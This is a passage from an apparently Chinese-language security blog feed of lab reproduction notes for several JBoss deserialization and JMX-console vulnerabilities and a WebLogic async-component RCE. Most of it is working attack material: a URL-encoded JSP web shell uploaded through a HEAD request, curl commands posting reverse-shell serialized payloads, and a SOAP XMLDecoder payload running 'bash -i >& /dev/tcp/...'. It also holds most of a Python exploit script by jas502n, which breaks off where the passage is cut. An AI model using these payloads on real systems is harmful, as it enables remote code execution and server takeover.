<span class="hljs-literal">null</span>; <span class="hljs-keyword">try</span> &#123; Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(p.getInputStream())); <span class="hljs-keyword">while</span>((s = sI.readLine()) != <span class="hljs-literal">null</span>) &#123; output += s +<span class="hljs-string">&quot;\r\n&quot;</span>; &#125; &#125; <span class="hljs-keyword">catch</span>(IOException e) &#123; e.printStackTrace(); &#125; &#125; out.println(output);%&gt;<br></code></pre></td></tr></table></figure><p>填写对应的地方</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209200419314.png" alt="image-20240209200419314"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209200433971.png" alt="image-20240209200433971"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209200510583.png" alt="image-20240209200510583"></p><p>访问成功</p><h2 id="CVE-2010-0738"><a href="#CVE-2010-0738" class="headerlink" title="CVE-2010-0738"></a>CVE-2010-0738</h2><p>0x00  漏洞简介</p><blockquote><p>利用原理与CVE-2007-1036相同，只不过利用HEAD请求方法绕过GET和POST请求的限制</p></blockquote><p>0x01  影响版本</p><blockquote><p>jboss4.2.0-jboss4.3.0</p></blockquote><p>0x02</p><p>payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">HEAD</span> <span class="hljs-string">/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodIndex=5&amp;arg0=../jmx-console.war/&amp;arg1=shell&amp;arg2=.jsp&amp;arg3=%3c%25%40%20%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%69%6f%2e%2a%22%20%25%3e%20%0d%0a%3c%25%20%53%74%72%69%6e%67%20%63%6d%64%20%3d%20%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%3b%20%53%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%22%22%3b%20%69%66%28%63%6d%64%20%21%3d%20%6e%75%6c%6c%29%20%7b%20%53%74%72%69%6e%67%20%73%20%3d%20%6e%75%6c%6c%3b%20%74%72%79%20%7b%20%50%72%6f%63%65%73%73%20%70%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%63%6d%64%29%3b%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%73%49%20%3d%20%6e%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%70%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%20%77%68%69%6c%65%28%28%73%20%3d%20%73%49%2e%72%65%61%64%4c%69%6e%65%28%29%29%20%21%3d%20%6e%75%6c%6c%29%20%7b%20%6f%75%74%70%75%74%20%2b%3d%20%73%20%2b%22%5c%72%5c%6e%22%3b%20%7d%20%7d%20%63%61%74%63%68%28%49%4f%45%78%63%65%70%74%69%6f%6e%20%65%29%20%7b%20%65%2e%70%72%69%6e%74%53%74%61%63%6b%54%72%61%63%65%28%29%3b%20%7d%20%7d%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6f%75%74%70%75%74%29%3b%25%3e&amp;arg4=True</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.yijinglab.com:51783<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,la;q=0.8,en;q=0.7<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>尝试访问</p><p><a href="http://target.yijinglab.com:51783/jmx-console/shell.jsp?cmd=id">target.yijinglab.com:51783&#x2F;jmx-console&#x2F;shell.jsp?cmd&#x3D;id</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209201812130.png" alt="image-20240209201812130"></p><h2 id="CVE-2017-7504"><a href="#CVE-2017-7504" class="headerlink" title="CVE-2017-7504"></a>CVE-2017-7504</h2><p>0x00  漏洞复现</p><p><a href="http://ip:port/invoker/JMXInvokerServlet，返回如下的response，说明接口是开放的，此接口存在漏洞">http://ip:port/invoker/JMXInvokerServlet，返回如下的response，说明接口是开放的，此接口存在漏洞</a></p><p>尝试访问，会下载东西，说明存在相对应的漏洞</p><p>0x01  使用JavaDeserH2HC利用</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">javac -cp .<span class="hljs-symbol">:commons-collections-</span><span class="hljs-number">3.2</span>.<span class="hljs-number">1</span>.jar <span class="hljs-title class_">ReverseShellCommonsCollectionsHashMap</span>.java<br><br>java -cp .<span class="hljs-symbol">:commons-collections-</span><span class="hljs-number">3.2</span>.<span class="hljs-number">1</span>.jar <span class="hljs-title class_">ReverseShellCommonsCollectionsHashMap</span> <span class="hljs-symbol">ip:</span>port<br></code></pre></td></tr></table></figure><p>开启监听，要和上面设置的端口是一致的</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -lvvp port</span><br></code></pre></td></tr></table></figure><p>尝试访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span>xx.xx.xx.xx:<span class="hljs-number">8080</span><span class="hljs-regexp">/invoker/</span>JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209204716696.png" alt="image-20240209204716696"></p><h2 id="CVE-2015-7501"><a href="#CVE-2015-7501" class="headerlink" title="CVE-2015-7501"></a>CVE-2015-7501</h2><p>0x00</p><p>和上面的基本一致，只是使用的接口不一样而已</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span>xx.xx.xx.xx:<span class="hljs-number">8080</span><span class="hljs-regexp">/invoker/</span>JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser<br></code></pre></td></tr></table></figure><h2 id="CVE-2017-12149"><a href="#CVE-2017-12149" class="headerlink" title="CVE-2017-12149"></a>CVE-2017-12149</h2><p>0x00  漏洞发现</p><blockquote><p>访问<a href="http://ip:port/invoker/readonly，若返回如下显示状态码为500的报错界面,则证明漏洞存在">http://ip:port/invoker/readonly，若返回如下显示状态码为500的报错界面,则证明漏洞存在</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209210214605.png" alt="image-20240209210214605"></p><p>发现存在</p><p>0x01  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span>IP地址:端口<span class="hljs-regexp">/invoker/</span>readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser<br></code></pre></td></tr></table></figure><p>使用对应的接口进行反序列化</p><h1 id="CVE-2017-12149-JBoss-AS-5-X-amp-47-6-X反序列化漏洞"><a href="#CVE-2017-12149-JBoss-AS-5-X-amp-47-6-X反序列化漏洞" class="headerlink" title="CVE-2017-12149 JBoss AS 5.X&amp;#47;6.X反序列化漏洞"></a>CVE-2017-12149 JBoss AS 5.X&amp;#47;6.X反序列化漏洞</h1><p>0x00  信息收集</p><p>由于知道ip，所以也没有什么可以收集的</p><p>就只用收集一个端口信息</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209212321013.png" alt="image-20240209212321013"></p><p>发现8080端口尝试访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209212447225.png" alt="image-20240209212447225"></p><p>通过jbossScan扫描</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209213003709.png" alt="image-20240209213003709"></p><p>发现存在CVE-2017-12149</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209213111210.png" alt="image-20240209213111210"></p><p>出现了500 说明存在该漏洞</p><p>0x01</p><p>尝试利用</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209213449302.png" alt="image-20240209213449302"></p><p>制作反序列化的时候出现这个问题，尝试转换java版本、</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209213607569.png" alt="image-20240209213607569"></p><p>然后重新运行</p><p>访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span>目标IP:<span class="hljs-number">8080</span><span class="hljs-regexp">/invoker/</span>readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser<br></code></pre></td></tr></table></figure><p>尝试使用jexboss</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 jexboss.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.1</span>.<span class="hljs-number">1.121</span>:<span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209220335030.png" alt="image-20240209220335030"></p><p>反弹成功</p>]]></content>
    
    
    
    <tags>
      
      <tag>整理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NVD-C-2019-48814</title>
    <link href="/2024/02/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/NVD-C-2019-48814/"/>
    <url>/2024/02/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/NVD-C-2019-48814/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的<a href="https://cloud.tencent.com/product/tdmq?from_column=20065&from=20065">中间件</a>，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和<a href="https://cloud.tencent.com/solution/database?from_column=20065&from=20065">数据库</a>应用的Java应用服务器。</p><p>WebLogic将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。是商业市场上主要的Java（J2EE）应用服务器软件（Application Server）之一，是世界上第一个成功商业化的J2EE应用服务器，具有可扩展性，快速开发，灵活，可靠性等优势。</p><p>CNVD-C-2019-48814漏洞主要是利用了WebLogic中的wls9-async组件，攻击者可以在</p><p>&#x2F;_async&#x2F;AsyncResponseService路径下传入恶意的xml格式的数据，传入的数据在服务器端反序列化时，执行其中的恶意代码，实现远程命令执行，攻击者可以进而获得整台服务器的权限。</p><h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><p>WebLogic 10.*</p><p>WebLogic 12.1.3.0</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>0x00</p><p>先关闭centos的防火墙</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">service iptables stop<br></code></pre></td></tr></table></figure><p><img src="D:\hexo\source_posts\漏洞复现\NVD-C-2019-48814.assets\image-20240209175418004.png" alt="image-20240209175418004"></p><p>启动weblogic</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/weblogic/</span>wlserver_10.<span class="hljs-number">3</span><span class="hljs-regexp">/samples/</span>domains<span class="hljs-regexp">/wl_server/</span>bin<br></code></pre></td></tr></table></figure><p>换回kali 查看是或否启动</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> <span class="hljs-number">10.1.1.100:7001</span> <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209175808072.png" alt="image-20240209175808072"></p><p>发现利用成功</p><p>漏洞验证</p><p>访问<a href="http://10.1.1.100:7001/_async/">http://10.1.1.100:7001/_async/</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209180000357.png" alt="image-20240209180000357"></p><p>继续访问<a href="http://10.1.1.100:7001/_async/AsyncResponseService">http://10.1.1.100:7001/_async/AsyncResponseService</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209180125962.png" alt="image-20240209180125962"></p><p>说明存在了NVD-C-2019-48814 漏洞</p><p>0x01</p><p>先使用nc 监听一个端口，用于接受反弹的shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>然后开启火狐的代理</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209181632662.png" alt="image-20240209181632662"></p><p>将端口设置成burpsuite的默认端口 8080</p><p>然后开启kali 自带的burpsuite</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209181736807.png" alt="image-20240209181736807"></p><p>利用方法一  使用手动抓取数据包的形式</p><p>抓取ttp:&#x2F;&#x2F;10.1.1.100:7001&#x2F;_async&#x2F;AsyncResponseService 的数据包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209182911352.png" alt="image-20240209182911352"></p><p>查看ip 地址</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209183621287.png" alt="image-20240209183621287"></p><p>使用payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_async/AsyncResponseService</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.1.1.100:7001<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>789<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">SOAPAction</span>:<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Apache-HttpClient/4.1.1 (java 1.5)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">content-type</span><span class="hljs-punctuation">: </span>text/xml<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="hljs-attr">xmlns:wsa</span>=<span class="hljs-string">&quot;http://www.w3.org/2005/08/addressing&quot;</span> <span class="hljs-attr">xmlns:asy</span>=<span class="hljs-string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span>   </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">wsa:Action</span>&gt;</span>xx<span class="hljs-tag">&lt;/<span class="hljs-name">wsa:Action</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">wsa:RelatesTo</span>&gt;</span>xx<span class="hljs-tag">&lt;/<span class="hljs-name">wsa:RelatesTo</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/bin/bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash -i <span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span> /dev/tcp/10.1.1.200/666 0<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>注意更改端口号和ip</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209183108034.png" alt="image-20240209183108034"></p><p>发送成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209183130738.png" alt="image-20240209183130738"></p><p>成功反弹shell</p><p>利用方法二  使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-comment">#author: jas502n</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><br>url = sys.argv[<span class="hljs-number">1</span>]<br><span class="hljs-comment"># &quot;http://10.10.20.166:7001/_async/AsyncResponseService&quot;</span><br>ip = sys.argv[<span class="hljs-number">2</span>]<br>port = sys.argv[<span class="hljs-number">3</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  ____                             </span><br><span class="hljs-string"> |  _ \                            </span><br><span class="hljs-string"> | |_) |_   _ _ __   __ _ ___ ___  </span><br><span class="hljs-string"> |  _ &lt;| | | | &#x27;_ \ / _` / __/ __| </span><br><span class="hljs-string"> | |_) | |_| | |_) | (_| \__ \__ \ </span><br><span class="hljs-string"> |____/ \__, | .__/ \__,_|___/___/ </span><br><span class="hljs-string">         __/ | |                   </span><br><span class="hljs-string">        |___/|_|   By jas502n                  </span><br><span class="hljs-string">            </span><br><span class="hljs-string">      No Pactch  For  CVE-2017-10271        </span><br><span class="hljs-string"></span><br><span class="hljs-string">     _async/AsyncResponseService RCE   </span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;&gt;&gt;&gt;&gt; usage: python test.py url reserve_ip reserve_port \n&quot;</span><br>payload = <span class="hljs-string">&quot;&lt;soapenv:Envelope xmlns:soapenv=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot; xmlns:wsa=\&quot;http://www.w3.org/2005/08/addressing\&quot; xmlns:asy=\&quot;http://www.bea.com/async/AsyncResponseService\&quot;&gt;   &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=\&quot;http://bea.com/2004/06/soap/workarea/\&quot;&gt;&lt;java version=\&quot;1.4.0\&quot; class=\&quot;java.beans.XMLDecoder\&quot;&gt;\r\n      &lt;void class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\r\n        &lt;array class=\&quot;java.lang.String\&quot; length=\&quot;3\&quot;&gt;\r\n          &lt;void index=\&quot;0\&quot;&gt;\r\n            &lt;string&gt;/bin/bash&lt;/string&gt;\r\n          &lt;/void&gt;\r\n          &lt;void index=\&quot;1\&quot;&gt;\r\n            &lt;string&gt;-c&lt;/string&gt;\r\n          &lt;/void&gt;\r\n          &lt;void index=\&quot;2\&quot;&gt;\r\n            &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/%s/%s 0&amp;gt;&amp;amp;1&lt;/string&gt;\r\n          &lt;/void&gt;\r\n        &lt;/array&gt;\r\n        &lt;void method=\&quot;start\&quot;/&gt;&lt;/void&gt;\r\n    &lt;/java&gt;\r\n&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;&quot;</span> % (ip,port)<br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&quot;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>,<br>    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&quot;127.0.0.2&quot;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&quot;close&quot;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&quot;text/xml&quot;</span>,<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&quot;963&quot;</span>,<br>    <span class="hljs-string">&#x27;cache-control&#x27;</span>: <span class="hljs-string">&quot;no-cache&quot;</span><br>  